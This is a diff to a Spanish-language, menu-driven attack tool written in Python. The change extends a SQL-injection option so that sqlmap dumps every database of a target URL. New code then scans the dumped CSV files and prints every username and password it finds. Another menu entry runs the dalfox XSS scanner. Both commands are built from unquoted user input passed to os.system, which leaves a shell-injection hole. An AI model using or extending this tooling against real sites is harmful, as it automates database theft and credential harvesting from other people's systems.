@@ -50,10 +50,37 @@ def menu_exploitation():
     elif sub == "2":
         url = input(f"  {CYAN}URL objetivo{RESET} » ").strip()
         cookie = input(f"  {CYAN}Cookie (ej: PHPSESSID=abc;security=low){RESET} » ").strip()
+        from urllib.parse import urlparse
+        import csv, glob
+        target = urlparse(url).netloc or urlparse(url).path.split("/")[0]
+        output_dir = f"/opt/vanta/reports/sqlmap_{target}"
+        os.makedirs(output_dir, exist_ok=True)
         if cookie:
-            os.system(f"sqlmap -u '{url}' --cookie='{cookie}' --dbs --batch")
+            os.system(f"sqlmap -u '{url}' --cookie='{cookie}' --dbs --dump-all --batch --output-dir='{output_dir}'")
         else:
-            os.system(f"sqlmap -u '{url}' --dbs --batch")
+            os.system(f"sqlmap -u '{url}' --dbs --dump-all --batch --output-dir='{output_dir}'")
+        # Parsear credenciales
+        print()
+        print(f"\033[96m{'='*50}\033[0m")
+        print(f"\033[96m  CREDENCIALES ENCONTRADAS\033[0m")
+        print(f"\033[96m{'='*50}\033[0m")
+        found = False
+        sqlmap_default = f"/home/ignacio/.local/share/sqlmap/output/{target}/dump"
+        for csv_file in glob.glob(f"{sqlmap_default}/**/*.csv", recursive=True):
+            try:
+                with open(csv_file) as f2:
+                    reader = csv.DictReader(f2)
+                    for row in reader:
+                        user = row.get("user") or row.get("username") or row.get("login") or "?"
+                        pwd = row.get("password") or row.get("pass") or "?"
+                        print(f"  \033[92m[+]\033[0m {user} : {pwd}")
+                        found = True
+            except:
+                pass
+        if not found:
+            print(f"  \033[93m[!] No se encontraron credenciales en los CSVs\033[0m")
+        print(f"\033[96m{'='*50}\033[0m")
+        print()
     elif sub == "3":
         url = input(f"  {CYAN}URL objetivo{RESET} » ").strip()
         os.system(f"dalfox url {url}")
